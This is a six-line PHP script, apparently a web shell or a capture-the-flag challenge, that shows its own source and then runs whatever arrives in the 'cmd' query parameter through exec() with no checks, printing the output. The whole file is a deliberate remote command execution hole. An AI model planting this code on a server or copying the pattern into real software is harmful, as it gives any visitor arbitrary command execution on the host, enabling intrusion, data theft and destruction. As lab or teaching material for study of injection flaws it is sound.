<?php
highlight_file(__FILE__);
$cmd = $_GET["cmd"];
exec($cmd,$array);
print_r($array);
?>